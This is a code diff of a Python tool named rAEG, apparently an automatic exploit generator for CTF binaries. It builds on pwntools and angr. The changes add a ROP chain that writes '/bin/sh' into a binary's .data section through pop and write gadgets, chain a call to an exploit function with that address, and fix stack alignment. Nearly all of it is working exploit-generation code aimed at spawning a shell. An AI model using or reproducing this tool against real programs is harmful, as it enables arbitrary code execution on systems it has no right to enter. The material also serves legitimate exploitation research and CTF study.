@@ -17,8 +17,8 @@ context.update(
     endian="little",
     log_level="warning",
     os="linux",
-    #terminal=["tmux", "split-window", "-h", "-p 65"]
-    terminal=["st"]
+    terminal=["tmux", "split-window", "-h", "-p 65"]
+    #terminal=["st"]
 )
 
 # Important lists to use
@@ -38,6 +38,7 @@ class rAEG:
         self.exploit_function = None
 
         self.rop_chain = None
+        self.chain_length = 0
         self.string_address = None
 
 
@@ -47,6 +48,8 @@ class rAEG:
         self.canary_leak = None
 
         self.flag = None
+        
+       
 
     # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
     def check_mem_corruption(self, simgr):
@@ -254,18 +257,44 @@ class rAEG:
                min_gadget = gadget
 
         log.info(f"Found write primitive gadget: {min_gadget}")
-        return min_gadget
+
+        reg1 = min_gadget.split(b"[")[1].split(b",")[0].split(b"]")[0].strip()
+        reg2 = min_gadget.split(b"[")[1].split(b",")[1].split(b"]")[0].split(b";")[0].strip()
+        print(reg1, reg2)
+        return min_gadget, reg1, reg2
 
     # Find writable address in binary
     def find_writable_address(self):
         return None
 
     # Write string to writable address in the binary
-    def rop_chain_write_string(self, string):
-
+    def rop_chain_write_string(self):
         chain = b""
 
-        return None
+        write = self.find_write_gadget()
+        gadget1 = self.find_pop_reg_gadget(write[1].decode())
+        gadget2 = self.find_pop_reg_gadget(write[2].decode())
+        addr = self.elf.get_section_by_name(".data").header.sh_addr
+        
+        pops = gadget1.split(b":")[1].strip().count(b"pop") - 1
+        chain += p64(int(gadget1.split(b":")[0].strip(), 16)) + p64(addr)
+        while pops > 0:
+            pops -= 1
+            chain += p64(0)
+        
+        pops = gadget2.split(b":")[1].strip().count(b"pop") - 1
+        chain += p64(int(gadget2.split(b":")[0].strip(), 16)) + b"/bin/sh\x00"
+        while pops > 0:
+            pops -= 1
+            chain += p64(0)
+        
+        pops = write[0].count(b"pop")
+        chain += p64(int(write[0].split(b":")[0].strip(), 16))
+        while pops > 0:
+            pops -= 1
+            chain += p64(0)
+
+        return chain
 
 
 
@@ -298,7 +327,9 @@ class rAEG:
                     continue
                 instructions = pop_reg_string.split(b";")
                 pop_reg = p64(int(pop_reg_string.split(b":")[0].strip(),16))
-                chain += pop_reg + parameters[i]
+                chain += pop_reg
+                print(parameters)
+                chain += parameters[i]
                 for instruction in instructions[1:]:
                     if b"ret" in instruction:
                         break
@@ -311,7 +342,7 @@ class rAEG:
                     chain += param
 
         # To avoid movaps error for ret2win put an extra ret
-        if function == "win" and len(parameters) <= 0:
+        if (len(chain) + self.chain_length + 8) % 16 != 0:
             chain += p64(self.elf.sym["_fini"])
         if function == "syscall":
             output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--only", "syscall"]).split(b"\n")
@@ -337,7 +368,11 @@ class rAEG:
         if self.string_address == None:
             #Perform a string write
             #
-            write_gadget = self.find_write_gadget()
+            self.rop_chain = self.rop_chain_write_string()
+            self.chain_length += len(self.rop_chain)
+            self.string_address = p64(self.elf.get_section_by_name(".data").header.sh_addr)
+            self.parameters[0] = self.string_address
+            self.rop_chain += self.rop_chain_call_function(self.exploit_function, self.parameters)
         else:
             self.rop_chain =  self.rop_chain_call_function(self.exploit_function, self.parameters)
 
@@ -403,8 +438,8 @@ if __name__ == "__main__":
     #parser.add_argument("libc", help="path of libc shared object")
     args = parser.parse_args()
 
-    #rage = rAEG(args.bin, "/opt/libc.so.6")
-    rage = rAEG(args.bin, "/usr/lib/libc.so.6")
+    rage = rAEG(args.bin, "/opt/libc.so.6")
+    #rage = rAEG(args.bin, "/usr/lib/libc.so.6")
     rage.find_vulnerability()
     rage.generate_rop_chain()
 
